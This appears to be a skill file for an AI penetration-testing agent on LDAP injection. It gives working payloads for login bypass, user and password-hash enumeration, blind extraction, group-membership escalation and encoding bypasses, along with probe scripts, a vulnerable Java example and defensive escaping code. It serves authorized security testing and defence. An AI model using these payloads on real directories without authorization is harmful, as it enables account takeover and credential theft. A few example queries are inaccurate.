---
name: ldap-injection-testing
description: LDAP injection vulnerability testing. Use when user input may reach LDAP
  query filters, directory authentication logic, or AD/LDAP search bases — including
  blind LDAP injection and filter-bypass scenarios.
---

# LDAP Injection Vulnerability Testing

> **AI LOAD INSTRUCTION**: LDAP injection testing for applications that construct LDAP queries from user input. Covers authentication bypass (`*)(&`, wildcard injection), information extraction (attribute enumeration), blind boolean extraction, encoding bypass, and privilege escalation via group membership injection. Targets include OpenLDAP, Active Directory, and 389 Directory. Base models often confuse LDAP injection with SQL injection — the filter syntax and exploitation techniques are fundamentally different.

## Overview

LDAP injection is a vulnerability similar to SQL injection that exploits flaws in LDAP query string construction, potentially leading to information disclosure and permission bypass. This skill provides methods for detecting, exploiting, and defending against LDAP injection.

## Vulnerability Mechanism

The application concatenates user input directly into LDAP query strings without sufficient validation and filtering, allowing attackers to modify query logic.

**Dangerous code example:**
```java
String filter = "(&(cn=" + userInput + ")(userPassword=" + password + "))";
ldapContext.search(baseDN, filter, ...);
```

## LDAP Basics

### Query Syntax

**Basic queries:**
```
(cn=John)
(objectClass=person)
(&(cn=John)(mail=john@example.com))
(|(cn=John)(cn=Jane))
(!(cn=John))
```

### Special Characters

**Characters that need escaping:**
- `(` `)` - Parentheses
- `*` - Wildcard
- `\` - Escape character
- `/` - Path separator
- `NUL` - Null character

## QUICK START

### First-pass probes

| Signal | Probe | Why |
|---|---|---|
| Login with `*` as username? | Username=`*` Password=`*` → submit | Wildcard matches all entries = auth bypass |
| `*)(\|(cn=*` triggers change? | Inject into search/login field | Closes current filter, opens new OR branch |
| Error messages visible? | Submit `*)(&` and observe response | Error may reveal LDAP filter structure |
| Blind extraction possible? | Compare `*)(cn=admin` vs `*)(cn=nonexistent` | Response diff = boolean oracle for char-by-char extraction |

```bash
# Quick test: LDAP auth bypass
# Username: *)(|(&
# Password: *
# If logged in → LDAP injection confirmed
```

## Testing Methodology

### 1. Identifying LDAP Input Points

**Common functionality:**
- User login
- User search
- Directory browsing
- Permission verification

### 2. Basic Detection

**Testing special characters:**
```
*)(&
*)(|
*))(
*))%00
```

**Testing logical operators:**
```
*)(&(cn=*
*)(|(cn=*
*))(!(cn=*
```

### 3. Authentication Bypass

**Basic bypass:**
```
Username: *)(&
Password: *
Query: (&(cn=*)(&)(userPassword=*))
```

**More precise bypass:**
```
Username: admin)(&(cn=admin
Password: *))
Query: (&(cn=admin)(&(cn=admin)(userPassword=*)))
```

### 4. Information Disclosure

**Enumerate users:**
```
*)(cn=*
*)(uid=*
*)(mail=*
```

**Get attributes:**
```
*)(|(cn=*)(userPassword=*
*)(|(objectClass=*)(cn=*
```

## Exploitation Techniques

### Authentication Bypass

**Method 1: Logic bypass**
```
Input: *)(&
Query: (&(cn=*)(&)(userPassword=*))
Result: Matches all users
```

**Method 2: Comment bypass**
```
Input: admin)(&(cn=admin
Query: (&(cn=admin)(&(cn=admin)(userPassword=*)))
```

**Method 3: Wildcard**
```
Input: *)(|(cn=*)(userPassword=*
Query: (&(cn=*)(|(cn=*)(userPassword=*)(userPassword=*))
```

### Information Disclosure

**Enumerate all users:**
```
Search: *)(cn=*
Result: Returns all cn attributes
```

**Get password hashes:**
```
Search: *)(|(cn=*)(userPassword=*
Result: Returns users and password hashes
```

**Get sensitive attributes:**
```
Search: *)(|(cn=*)(mail=*)(telephoneNumber=*
Result: Returns multiple sensitive attributes
```

### Privilege Escalation

**Modify query logic:**
```
Original: (&(cn=user)(memberOf=CN=Users,DC=example,DC=com))
Injection: user)(memberOf=CN=Admins,DC=example,DC=com))(|(cn=user
Result: May bypass permission checks
```

## Bypass Techniques

### Encoding Bypass

**URL encoding:**
```
*)(& → %2A%29%28%26
*)(| → %2A%29%28%7C
```

**Unicode encoding:**
```
* → \u002A
( → \u0028
) → \u0029
```

### Comment Bypass

**Using comments:**
```
*)(&(cn=*
*)(|(cn=*
```

### Null Byte Injection

**Using NULL bytes:**
```
*))%00
```

## Tools

### JXplorer

**Graphical LDAP client:**
- Connect to LDAP server
- Browse directory structure
- Execute query tests

### ldapsearch

```bash
# Basic query
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(cn=*)"

# Test injection
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(cn=*)(&"
```

### Burp Suite

1. Intercept LDAP query requests
2. Modify query parameters
3. Observe response results

### Python Script

```python
import ldap3

server = ldap3.Server('ldap://target.com')
conn = ldap3.Connection(server, authentication=ldap3.SIMPLE,
                        user='cn=admin,dc=example,dc=com',
                        password='password')

# Test injection
filter_str = '*)(&'
conn.search('dc=example,dc=com', filter_str)
print(conn.entries)
```

## Verification and Reporting

### Verification Steps

1. Confirm ability to control LDAP query
2. Verify authentication bypass or information disclosure
3. Assess impact (unauthorized access, data leakage, etc.)
4. Document complete PoC

### Report Essentials

- Vulnerability location and input parameters
- LDAP query construction method
- Complete exploitation steps and PoC
- Fix recommendations

## Defense Measures

### Recommended Solutions

1. **Input validation**
   ```java
   private static final String[] LDAP_ESCAPE_CHARS = 
       {"\\", "*", "(", ")", "\0", "/"};
   
   public static String escapeLDAP(String input) {
       if (input == null) {
         return null;
       }
       StringBuilder sb = new StringBuilder();
       for (int i = 0; i < input.length(); i++) {
         char c = input.charAt(i);
         if (Arrays.asList(LDAP_ESCAPE_CHARS).contains(String.valueOf(c))) {
           sb.append("\\");
         }
         sb.append(c);
       }
       return sb.toString();
   }
   ```

2. **Parameterized queries**
   ```java
   // Use LDAP API parameterized functionality
   String filter = "(&(cn={0})(userPassword={1}))";
   Object[] args = {escapedCN, escapedPassword};
   // Build query using API
   ```

3. **Whitelist validation**
   ```java
   // Only allow specific characters
   if (!input.matches("^[a-zA-Z0-9@._-]+$")) {
       throw new IllegalArgumentException("Invalid input");
   }
   ```

4. **Least privilege**
   - Use least privilege accounts for LDAP connections
   - Restrict queryable attributes
   - Use access control lists

5. **Error handling**
   - Do not return detailed error messages
   - Unified error response
   - Log errors

## DECISION TREE

```
LDAP search input point found (login, directory lookup, access control)?
├── LDAP special characters (*, (, ), \) cause error or behavior change?
│   ├── Authentication bypass possible (login form)?
│   │   ├── Logical bypass: *)(& with password *?
│   │   │   └── Confirm auth bypass — session granted without valid creds
│   │   └── Comment/precision bypass: admin)(&(cn=admin?
│   │       └── Confirm targeted auth bypass
│   ├── Information extraction possible (search/directory)?
│   │   ├── Wildcard enumeration: *)(cn=* returns all users?
│   │   │   └── Extract attributes: userPassword, mail, telephoneNumber
│   │   └── Attribute leak: *)(|(cn=*)(userPassword=*?
│   │       └── Confirm sensitive data disclosure
│   └── No visible data but response differs?
│       └── Blind boolean injection: compare *)(cn=admin vs *)(cn=nonexistent
│           └── Extract data character by character via boolean conditions
├── Special characters blocked?
│   └── Try encoding bypass: URL-encode, Unicode, NULL-byte (*))%00)
│       └── Any response difference?
│           └── Proceed with bypass-appropriate technique
└── No LDAP injection found?
    └── Report not reproduced; verify LDAP sink and input flow
```

## TESTING CHECKLIST

- [ ] Identify all user-controlled inputs that feed into LDAP queries (login forms, user search, directory lookup, access control checks)
- [ ] Test LDAP special characters: `*`, `(`, `)`, `\`, `/`, NUL byte — observe errors or behavior changes
- [ ] Test authentication bypass: username `*)(&` with password `*`, or `admin)(&(cn=admin` / `*))`
- [ ] Test wildcard-based user enumeration: `*)(cn=*`, `*)(uid=*`, `*)(mail=*`
- [ ] Test information extraction: `*)(|(cn=*)(userPassword=*`, `*)(|(objectClass=*)(cn=*` to leak attributes
- [ ] Test blind LDAP injection: inject boolean conditions like `*)(cn=admin` (positive) vs `*)(cn=nonexistent` (negative) and compare responses
- [ ] Test privilege escalation: inject `user)(memberOf=CN=Admins,DC=example,DC=com))(|(cn=user` into group membership checks
- [ ] Test encoding bypasses: URL-encode (`%2A%29%28%26`), Unicode (`*`), and NULL-byte (`*))%00`) variants
- [ ] Test across different LDAP server implementations (OpenLDAP, Active Directory, 389 Directory) for syntax differences
- [ ] Verify fix with proper LDAP escaping, parameterized queries, or whitelist input validation

## TARGET TOOL ADAPTATION

Use visible `http-framework-test` for baseline/probe comparison, `nuclei` only with a narrowly selected relevant template, and `execute-python-script` for controlled mutation when necessary. Do not assume a repeater or API-fuzzer MCP exists.

## Notes

- Only perform in authorized testing environments
- Note syntax differences between LDAP server implementations
- Avoid impacting the directory during testing
- Understand the target LDAP server configuration

## RELATED ROUTING

- [authentication-bypass](../authbypass-authentication-flaws/SKILL.md) — LDAP auth bypass is a direct authentication flaw
- [sqli](../sqli-sql-injection/SKILL.md) — SQL injection shares analogous injection methodology with LDAP injection
- [xpath-injection](../xpath-injection-testing/SKILL.md) — XPath injection shares query-construction abuse patterns with LDAP injection
- [xxe](../xxe-xml-external-entity/SKILL.md) — XML-related attacks that can target LDAP backends via external entity injection
